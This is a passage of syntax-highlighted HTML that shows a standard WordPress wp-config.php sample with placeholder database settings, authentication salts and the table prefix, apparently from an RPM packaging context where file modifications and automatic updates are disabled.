&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MySQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hostname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_HOST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Database&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Charset&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;creating&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_CHARSET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;The&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Database&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Collate&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Don&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t change this if in doubt. */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DB_COLLATE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#@+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Authentication&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Unique&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Keys&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Salts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Change&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;these&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;different&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unique&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;phrases&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;You&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;can&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;generate&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;these&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;api&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordpress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;You&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;can&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;change&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;these&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;any&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;point&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;invalidate&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;existing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;This&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;will&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;have&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;log&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;again&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;since&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.6&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;AUTH_KEY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;         &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;SECURE_AUTH_KEY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LOGGED_IN_KEY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;NONCE_KEY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;AUTH_SALT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;SECURE_AUTH_SALT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LOGGED_IN_SALT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;   &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;NONCE_SALT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;       &lt;span class=&#34;s1&#34;&gt;&amp;#39;put your unique phrase here&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#@-*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Database&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Table&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;You&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;can&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;have&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;multiple&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;installations&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;one&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;you&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;give&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;each&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unique&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Only&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;numbers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;letters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;underscores&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;please&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_prefix&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;See&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;make&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordpress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2013&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;the&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;definitive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;guide&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;disabling&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auto&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;updates&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordpress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Disable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;change&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPM&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;installation&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;only&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DISALLOW_FILE_MODS&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Disable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;automatic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;updater&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;you&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;want&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;allow&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;above&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FILE_MODS&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;plugins&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;themes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;AUTOMATIC_UPDATER_DISABLED&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Core&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;update&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;always&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WP_AUTO_UPDATE_CORE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ignore&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;For&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;developers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;debugging&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Change&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;enable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;display&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;notices&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;during&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;development&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
